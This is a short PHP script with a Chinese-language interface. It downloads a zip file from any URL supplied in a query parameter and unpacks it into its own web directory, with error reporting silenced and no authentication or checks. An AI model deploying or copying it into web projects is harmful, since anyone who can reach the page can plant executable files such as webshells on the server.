<?php
/*
* Package: FTP Installer
* Author: Achunk JealousMan
* Email: achunk17@gmail.com
* Site: http://7ko.in
*/
error_reporting(0);
ignore_user_abort(true);
if(!class_exists('ZipArchive')) {
die("调用ZipArchive类失败！");
}
function zipExtract ($src, $dest)
    {
        $zip = new ZipArchive();
        if ($zip->open($src)===true)
        {
            $zip->extractTo($dest);
            $zip->close();
            return true;
        }
        return false;
    }

echo '<html><head><title>远程在线安装</title></head><body>';
if (!isset($_GET['zip'])) {
echo '<form method="get" action="?"><b>文件地址：</b><br /><input type="text" name="zip" value="http://"/><input type="submit" value="Install"/></form></body></html>';
exit;
}
$RemoteFile = rawurldecode($_GET["zip"]);
$ZipFile = "Archive.zip";
$Dir = "./";

copy($RemoteFile,$ZipFile) or die("无法复制文件 <b>".$RemoteFile);

if (zipExtract($ZipFile,$Dir)) {
echo "<b>".basename($RemoteFile)."</b> 成功解压文件到当前目录.";
unlink($ZipFile);

}
else {
echo "无法解压该文件 <b>".$ZipFile.".</b>";
if (file_exists($ZipFile)) {
unlink($ZipFile);
}

}
echo '</body></html>';
?>